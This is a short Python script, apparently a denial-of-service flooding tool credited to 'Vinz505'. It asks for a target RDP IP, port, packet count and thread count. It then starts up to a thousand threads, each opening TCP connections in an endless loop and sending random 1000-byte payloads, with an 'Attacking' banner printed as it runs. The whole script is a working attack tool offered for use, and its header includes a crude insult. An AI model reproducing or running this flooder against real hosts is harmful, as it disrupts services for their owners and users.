# Coding Time By Vinz505
# Tools Usage By : Vinz505
# Tools Credit By : Vinz505
# Don't Leak Your Tools Now !!!

# Import Module
import random
import socket
import threading
import os
# Info Tools [ Vinz505 Tools ]
os.system("clear")

print("--------------------------------------")
print("[+] Tools Created By : Vinz505")
print("[+] Dont Leak This Tools ")
print("[+] Dont Be a Abuser ")
print("[+] OMAGAAAA")
print("[+] Vinz505 Suka Bapakmu ")
print("---------------------------------------")

ip = str(input("[/] Enter RDP IP : "))
port = int(input("[/] Enter RDP Port (80/3389)   : "))
times = int(input("[/] Enter Packet : "))
threads = int(input("[/] Enter Thread (1000) : "))

def run():
    data = random._urandom(1000)
    i = random.choice(("[*]","[!]","[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +" Sent!!!")
        except socket.error:
            s.close()
            print("[!] Attacking By Vinz505 Tools => ",ip," With Port : ",port,"!")

for y in range(threads):
    th = threading.Thread(target = run)
    th.start()
